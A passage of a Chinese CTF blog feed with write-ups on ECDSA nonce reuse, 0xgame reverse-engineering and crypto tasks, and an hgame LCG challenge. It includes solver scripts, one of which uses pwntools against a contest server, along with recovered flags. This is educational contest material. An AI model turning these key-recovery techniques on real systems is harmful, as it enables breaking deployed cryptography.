class="string">&quot;ctfshow&#123;F_5_F_5_F_5_F_5_F_5_F_5_F_5_F_5_F_5_F_5&#125;&quot;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">print(s1.r)</span><br><span class="line">print((s1.s, s2.s))</span><br><span class="line">print((h1, h2))</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#60963656919952335330699495914604076133088545196341270906012199546992023482470</span></span><br><span class="line"><span class="comment">#(73717183989655107551694042301768298629060759808504642594624975900023461782627, 14687661690747284846117782855464712425538068387758686204509438427659320546252)</span></span><br><span class="line"><span class="comment">#(78282427923826024273891589234109005052482119099079121663545750577095212333215, 95633252274852616927283591980907278832230595718028531805745075047977731184020)</span></span><br><span class="line"><span class="comment">#28ff889a4bf476378f0dd924e1c8ccdd78aba055bf3f24e617a558c8333d4e283ed54186576f50c24fe3109823ade497</span></span><br></pre></td></tr></table></figure><p>NIST256p是一个ECC推荐参数。也就是给定曲线，n已知。</p><p>且用相同的K签名。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">r=<span class="number">60963656919952335330699495914604076133088545196341270906012199546992023482470</span></span><br><span class="line">s1=<span class="number">73717183989655107551694042301768298629060759808504642594624975900023461782627</span></span><br><span class="line">s2=<span class="number">14687661690747284846117782855464712425538068387758686204509438427659320546252</span></span><br><span class="line">h1=<span class="number">78282427923826024273891589234109005052482119099079121663545750577095212333215</span></span><br><span class="line">h2=<span class="number">95633252274852616927283591980907278832230595718028531805745075047977731184020</span></span><br><span class="line">c=<span class="number">0x28ff889a4bf476378f0dd924e1c8ccdd78aba055bf3f24e617a558c8333d4e283ed54186576f50c24fe3109823ade497</span></span><br><span class="line">n=<span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">k=(invert((s1-s2),n)*(h1-h2))%n</span><br><span class="line">print(k)</span><br><span class="line">d=<span class="number">37791682356041176430586914331338157883737680803292173075282962428996323272403</span></span><br><span class="line">print(d)</span><br><span class="line">key=d.to_bytes(<span class="number">64</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">print(key)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">n= cipher.decrypt(long_to_bytes(c))</span><br><span class="line">print(n)</span><br><span class="line"><span class="comment">#73092245794933305962848542028152783930</span></span><br><span class="line"><span class="comment">#37791682356041176430586914331338157883737680803292173075282962428996323272403</span></span><br><span class="line"><span class="string">b&#x27;\xd3fjy\xe6\x9d^\xa9?\xe4\xd1\xa6\x8f\x0f\x9e\xf2&#x27;</span></span><br><span class="line"><span class="string">b&#x27;ctfshow&#123;F5_cAn_S0lv3_8AsIC_3CDsA_pr08L3M&#125;\x07\x07\x07\x07\x07\x07\x07&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>引用：</p><p><a href="http://wpa.qq.com/msgrd?v=3&amp;uin=2454225341&amp;site=qq&amp;menu=yes">http://wpa.qq.com/msgrd?v=3&amp;uin=2454225341&amp;site=qq&amp;menu=yes</a></p><p><a href="https://ohmygodlin.github.io/ctf/crypto/2019/03/28/DSA%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">https://ohmygodlin.github.io/ctf/crypto/2019/03/28/DSA%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;-&lt;/p&gt;
&lt;h1 id=&quot;DSA&quot;&gt;&lt;a href=&quot;#DSA&quot; class=&quot;headerlink&quot; title=&quot;DSA&quot;&gt;&lt;/a&gt;DSA&lt;/h1&gt;&lt;h2 id=&quot;DSA签名过程：&quot;&gt;&lt;a href=&quot;#DSA签名过程：&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>0xgame2020-Rev 复现</title>
    <link href="http://example.com/2021/02/22/0xgame2020-Rev-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/02/22/0xgame2020-Rev-%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-02-22T15:18:05.000Z</published>
    <updated>2021-02-22T16:35:06.457Z</updated>
    
    <content type="html"><![CDATA[<p>0xgame</p><h1 id="RE–week1"><a href="#RE–week1" class="headerlink" title="RE–week1"></a>RE–week1</h1><h2 id="1-签到1"><a href="#1-签到1" class="headerlink" title="1.签到1"></a>1.签到1</h2><p>ida载入，进入主函数即可看到flag<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210201025104419.png" alt="image-20210201025104419"></p><h2 id="2-签到2"><a href="#2-签到2" class="headerlink" title="2.签到2"></a>2.签到2</h2><p>查壳发现是upx壳，使用OD载入，使用esp定律法脱壳，然后只能搜索发现flag</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210201025008084.png" alt="image-20210201025008084"></p><h2 id="3-easybit"><a href="#3-easybit" class="headerlink" title="3.easybit"></a>3.easybit</h2><p>直接爆破。逻辑很简单，注意是低八位，与上0xff</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210201030209689.png" alt="image-20210201030209689"></p><h2 id="4-Z3"><a href="#4-Z3" class="headerlink" title="4.Z3"></a>4.Z3</h2><p>使用z3库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v5=[ <span class="number">0x51C5</span>, <span class="number">0x0A240</span>, <span class="number">0x8359</span>, <span class="number">0x9590</span>, <span class="number">0x69D9</span>, <span class="number">0x9EC9</span>, <span class="number">0x4916</span>, <span class="number">0x48B9</span>, <span class="number">0x0A376</span>, <span class="number">0x8CF0</span>, <span class="number">0x8985</span>, <span class="number">0x70D8</span>, <span class="number">0x8DFA</span>, <span class="number">0x4979</span>, <span class="number">0x5135</span>, <span class="number">0x99AC</span>,</span><br><span class="line"><span class="number">0x7C3B</span>, <span class="number">0x835D</span>, <span class="number">0x5F62</span>, <span class="number">0x8558</span>, <span class="number">0x4078</span>, <span class="number">0x4CB6</span>, <span class="number">0x9E43</span>, <span class="number">0x8E2C</span>,</span><br><span class="line"><span class="number">0x93CF</span>, <span class="number">0x713A</span>, <span class="number">0x0A2EF</span>, <span class="number">0x48AD</span> ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Str = [0]*32</span></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#    Str[i] = Int(&#x27;Str[&#x27;+str(i)+&#x27;]&#x27;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># s = Solver()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># s.add(v5[0] == 34 * Str[3] + 12 * Str[0] + 53 * Str[1] + 6 * Str[2] + 58 * Str[4] + 36 * Str[5] + Str[6])</span></span><br><span class="line"><span class="comment"># s.add(v5[1] == 83 * Str[0] + 73 * Str[3] + 27 * Str[4] + 12 * Str[2] + 85 * Str[1] + 96 * Str[5] + 52 * Str[6])</span></span><br><span class="line"><span class="comment"># s.add(v5[2] == 78 * Str[0] + 24 * Str[2] + 53 * Str[1] + 36 * Str[3] + 86 * Str[4] + 25 * Str[5] + 46 * Str[6])</span></span><br><span class="line"><span class="comment"># s.add(v5[3] == 39 * Str[0] + 78 * Str[1] + 52 * Str[2] + 9 * Str[3] + 62 * Str[4] + 37 * Str[5] + 84 * Str[6])</span></span><br><span class="line"><span class="comment"># s.add(v5[4] == 48 * Str[4] + 14 * Str[2] + 23 * Str[0] + 6 * Str[1] + 74 * Str[3] + 12 * Str[5] + 83 * Str[6])</span></span><br><span class="line"><span class="comment"># s.add(v5[5] == 92 * Str[2] + 15 * Str[5] + 48 * Str[4] + 85 * Str[1] + 27 * Str[0] + 42 * Str[3] + 72 * Str[6])</span></span><br><span class="line"><span class="comment"># s.add(v5[6] == 26 * Str[5] + 67 * Str[3] + 6 * Str[1] + 4 * Str[0] + 3 * Str[2] + 68 * Str[6])</span></span><br><span class="line"><span class="comment"># s.add(  v5[7] == 34 * Str[10] + 12 * Str[7] + 53 * Str[8] + 6 * Str[9] + 58 * Str[11] + 36 * Str[12] + Str[13])</span></span><br><span class="line"><span class="comment"># s.add(  v5[8] == 83 * Str[7] + 73 * Str[10] + 27 * Str[11] + 12 * Str[9] + 85 * Str[8] + 96 * Str[12] + 52 * Str[13])</span></span><br><span class="line"><span class="comment"># s.add(  v5[9] == 78 * Str[7] + 24 * Str[9] + 53 * Str[8] + 36 * Str[10] + 86 * Str[11] + 25 * Str[12] + 46 * Str[13])</span></span><br><span class="line"><span class="comment"># s.add(  v5[10] == 39 * Str[7] + 78 * Str[8] + 52 * Str[9] + 9 * Str[10] + 62 * Str[11] + 37 * Str[12] + 84 * Str[13]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[11] == 48 * Str[11] + 14 * Str[9] + 23 * Str[7] + 6 * Str[8] + 74 * Str[10] + 12 * Str[12] + 83 * Str[13])</span></span><br><span class="line"><span class="comment"># s.add(  v5[12] == 92 * Str[9] + 15 * Str[12] + 48 * Str[11] + 85 * Str[8] + 27 * Str[7] + 42 * Str[10] + 72 * Str[13]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[13] == 26 * Str[12] + 67 * Str[10] + 6 * Str[8] + 4 * Str[7] + 3 * Str[9] + 68 * Str[13]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[14] == 34 * Str[17] + 12 * Str[14] + 53 * Str[15] + 6 * Str[16] + 58 * Str[18] + 36 * Str[19] + Str[20]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[15] == 83 * Str[14] + 73 * Str[17] + 27 * Str[18] + 12 * Str[16] + 85 * Str[15] + 96 * Str[19] + 52 * Str[20]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[16] == 78 * Str[14] + 24 * Str[16] + 53 * Str[15] + 36 * Str[17] + 86 * Str[18] + 25 * Str[19] + 46 * Str[20]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[17] == 39 * Str[14] + 78 * Str[15] + 52 * Str[16] + 9 * Str[17] + 62 * Str[18] + 37 * Str[19] + 84 * Str[20]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[18] == 48 * Str[18] + 14 * Str[16] + 23 * Str[14] + 6 * Str[15] + 74 * Str[17] + 12 * Str[19] + 83 * Str[20]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[19] == 92 * Str[16] + 15 * Str[19] + 48 * Str[18] + 85 * Str[15] + 27 * Str[14] + 42 * Str[17] + 72 * Str[20]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[20] == 26 * Str[19] + 67 * Str[17] + 6 * Str[15] + 4 * Str[14] + 3 * Str[16] + 68 * Str[20]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[21] == 34 * Str[24] + 12 * Str[21] + 53 * Str[22] + 6 * Str[23] + 58 * Str[25] + 36 * Str[26] + Str[27])</span></span><br><span class="line"><span class="comment"># s.add(  v5[22] == 83 * Str[21] + 73 * Str[24] + 27 * Str[25] + 12 * Str[23] + 85 * Str[22] + 96 * Str[26] + 52 * Str[27]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[23] == 78 * Str[21] + 24 * Str[23] + 53 * Str[22] + 36 * Str[24] + 86 * Str[25] + 25 * Str[26] + 46 * Str[27]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[24] == 39 * Str[21] + 78 * Str[22] + 52 * Str[23] + 9 * Str[24] + 62 * Str[25] + 37 * Str[26] + 84 * Str[27]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[25] == 48 * Str[25] + 14 * Str[23] + 23 * Str[21] + 6 * Str[22] + 74 * Str[24] + 12 * Str[26] + 83 * Str[27]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[26] == 92 * Str[23] + 15 * Str[26] + 48 * Str[25] + 85 * Str[22] + 27 * Str[21] + 42 * Str[24] + 72 * Str[27]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># s.add(  v5[27] == 26 * Str[26] + 67 * Str[24] + 6 * Str[22] + 4 * Str[21] + 3 * Str[23] + 68 * Str[27]</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># if s.check()==sat:</span></span><br><span class="line"><span class="comment">#     print(s.model())</span></span><br><span class="line">Str=[<span class="number">0</span>]*<span class="number">33</span></span><br><span class="line">Str[<span class="number">12</span>] = <span class="number">95</span></span><br><span class="line">Str[<span class="number">16</span>] = <span class="number">55</span></span><br><span class="line">Str[<span class="number">0</span>] = <span class="number">48</span></span><br><span class="line">Str[<span class="number">10</span>] = <span class="number">108</span></span><br><span class="line">Str[<span class="number">15</span>] = <span class="number">114</span></span><br><span class="line">Str[<span class="number">5</span>] = <span class="number">101</span></span><br><span class="line">Str[<span class="number">21</span>] = <span class="number">97</span></span><br><span class="line">Str[<span class="number">14</span>] = <span class="number">51</span></span><br><span class="line">Str[<span class="number">26</span>] = <span class="number">33</span></span><br><span class="line">Str[<span class="number">11</span>] = <span class="number">115</span></span><br><span class="line">Str[<span class="number">17</span>] = <span class="number">95</span></span><br><span class="line">Str[<span class="number">9</span>] = <span class="number">95</span></span><br><span class="line">Str[<span class="number">2</span>] = <span class="number">103</span></span><br><span class="line">Str[<span class="number">19</span>] = <span class="number">101</span></span><br><span class="line">Str[<span class="number">23</span>] = <span class="number">102</span></span><br><span class="line">Str[<span class="number">1</span>] = <span class="number">120</span></span><br><span class="line">Str[<span class="number">8</span>] = <span class="number">51</span></span><br><span class="line">Str[<span class="number">18</span>] = <span class="number">118</span></span><br><span class="line">Str[<span class="number">24</span>] = <span class="number">117</span></span><br><span class="line">Str[<span class="number">25</span>] = <span class="number">108</span></span><br><span class="line">Str[<span class="number">4</span>] = <span class="number">109</span></span><br><span class="line">Str[<span class="number">7</span>] = <span class="number">122</span></span><br><span class="line">Str[<span class="number">3</span>] = <span class="number">97</span></span><br><span class="line">Str[<span class="number">22</span>] = <span class="number">119</span></span><br><span class="line">Str[<span class="number">27</span>] = <span class="number">125</span></span><br><span class="line">Str[<span class="number">20</span>] = <span class="number">95</span></span><br><span class="line">Str[<span class="number">13</span>] = <span class="number">118</span></span><br><span class="line">Str[<span class="number">6</span>] = <span class="number">123</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Str)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(Str[i])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#0xgame&#123;z3_ls_v3r7_ve_awful!&#125;     </span></span><br></pre></td></tr></table></figure><h2 id="5-pyc"><a href="#5-pyc" class="headerlink" title="5.pyc"></a>5.pyc</h2><p>使用uncompyle6 命令对pyc进行反编译</p><p>指令为  uncompyle6  ***.pyc -&gt;flag.py</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210202131227536.png" alt="image-20210202131227536"></p><h1 id="RE-week2"><a href="#RE-week2" class="headerlink" title="RE-week2"></a>RE-week2</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;0xgame&lt;/p&gt;
&lt;h1 id=&quot;RE–week1&quot;&gt;&lt;a href=&quot;#RE–week1&quot; class=&quot;headerlink&quot; title=&quot;RE–week1&quot;&gt;&lt;/a&gt;RE–week1&lt;/h1&gt;&lt;h2 id=&quot;1-签到1&quot;&gt;&lt;a href=&quot;#1-签到1&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>0xgame2020-Crypto 复现</title>
    <link href="http://example.com/2021/02/22/0xgame2020-Crypto-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/02/22/0xgame2020-Crypto-%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-02-22T15:16:51.000Z</published>
    <updated>2021-02-22T15:21:16.279Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Crypto-–-week1"><a href="#Crypto-–-week1" class="headerlink" title="Crypto – week1"></a>Crypto – week1</h1><h2 id="1-Calendar"><a href="#1-Calendar" class="headerlink" title="1.Calendar"></a>1.Calendar</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210202011410628.png" alt="image-20210202011410628"></p><h2 id="2-easyXor"><a href="#2-easyXor" class="headerlink" title="2.easyXor"></a>2.easyXor</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210202012628577.png" alt="image-20210202012628577"></p><h2 id="3-equationSet"><a href="#3-equationSet" class="headerlink" title="3.equationSet"></a>3.equationSet</h2><p>z3求,p,q,r</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210202014313351.png" alt="image-20210202014313351"></p><p>解rsa正常解法</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210202014329462.png" alt="image-20210202014329462"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Crypto-–-week1&quot;&gt;&lt;a href=&quot;#Crypto-–-week1&quot; class=&quot;headerlink&quot; title=&quot;Crypto – week1&quot;&gt;&lt;/a&gt;Crypto – week1&lt;/h1&gt;&lt;h2 id=&quot;1-Calendar&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2021-hgame-week4-Crypto</title>
    <link href="http://example.com/2021/02/22/2021-hgame-week4-Crypto/"/>
    <id>http://example.com/2021/02/22/2021-hgame-week4-Crypto/</id>
    <published>2021-02-22T14:16:40.000Z</published>
    <updated>2021-02-24T00:45:11.044Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-寻宝大冒险1"><a href="#1-寻宝大冒险1" class="headerlink" title="1.寻宝大冒险1"></a>1.寻宝大冒险1</h1><p><del>抢了一个三血</del></p><h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>nc 182.92.108.71 30641</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/nil2NEBlE2eeay9s.py?attname=%E5%AF%BB%E5%AE%9D%E5%A4%A7%E5%86%92%E9%99%A91.py&download">附件</a></p><p>基准分数 350</p><p>当前分数 350</p><p>完成人数 17</p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>就是LCG全家桶（见我之前的<a href="https://h-lither.github.io/2021/01/28/Crypto-LCG/">博客</a>），不过数都是随机的，可能不能满足标准LCG。故要写脚本爆破。</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>(<span class="params">a,m,x1,x2</span>):</span></span><br><span class="line">    a = <span class="built_in">int</span>(a)</span><br><span class="line">    n = <span class="built_in">int</span>(m)</span><br><span class="line">    output1 = <span class="built_in">int</span>(x1)</span><br><span class="line">    output2 = <span class="built_in">int</span>(x2)</span><br><span class="line">    b = (output2 - a * output1) % n</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span>(<span class="params">m,x3,x4,x5</span>):</span></span><br><span class="line">    n = <span class="built_in">int</span>(m)</span><br><span class="line">    output = [<span class="built_in">int</span>(x3), <span class="built_in">int</span>(x4), <span class="built_in">int</span>(x5)]</span><br><span class="line">    d = inverse((output[<span class="number">1</span>] - output[<span class="number">0</span>]), n)</span><br><span class="line">    a = (output[<span class="number">2</span>] - output[<span class="number">1</span>]) * inverse((output[<span class="number">1</span>] - output[<span class="number">0</span>]), n) % n</span><br><span class="line">    ani = inverse(a, n)</span><br><span class="line">    b = (output[<span class="number">1</span>] - a * output[<span class="number">0</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> a ,b</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun3</span>(<span class="params">x6,x7,x8,x9,x10,x11,x12</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line">    s = [<span class="built_in">int</span>(x6),</span><br><span class="line">         <span class="built_in">int</span>(x7),</span><br><span class="line">         <span class="built_in">int</span>(x8),</span><br><span class="line">         <span class="built_in">int</span>(x9),</span><br><span class="line">         <span class="built_in">int</span>(x10),</span><br><span class="line">         <span class="built_in">int</span>(x11),</span><br><span class="line">         <span class="built_in">int</span>(x12)</span><br><span class="line">         ]</span><br><span class="line">    t = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        t.append((s[i] - s[i - <span class="number">1</span>]))</span><br><span class="line">    all_n = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        all_n.append(gcd((t[i + <span class="number">1</span>] * t[i - <span class="number">1</span>] - t[i] * t[i]), (t[i + <span class="number">2</span>] * t[i] - t[i + <span class="number">1</span>] * t[i + <span class="number">1</span>])))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">        n=<span class="built_in">abs</span>(n)</span><br><span class="line"></span><br><span class="line">    x=all_n[<span class="number">2</span>]</span><br><span class="line">    y=all_n[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> x <span class="keyword">if</span> x &lt; y <span class="keyword">else</span> y</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> k&lt;<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">30641</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># context.log_level = &#x27;Debug&#x27;</span></span><br><span class="line">        n=p.recvline()[<span class="number">1</span>:-<span class="number">2</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        a1=n[:<span class="number">20</span>].replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        m1=n[<span class="number">20</span>:].replace(<span class="string">&#x27;, &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        x1=p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        x2=p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        f1=fun1(a1,m1,x1,x2)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(f1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        m2=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        x3=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        x4=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x5=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        f21,f22=fun2(m2,x3,x4,x5)</span><br><span class="line"></span><br><span class="line">        p.sendline(<span class="built_in">str</span>(f21))</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(f22))</span><br><span class="line"></span><br><span class="line">        x6=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x7=p.recvline()[:-<span class="number">1</span>].decode(<span 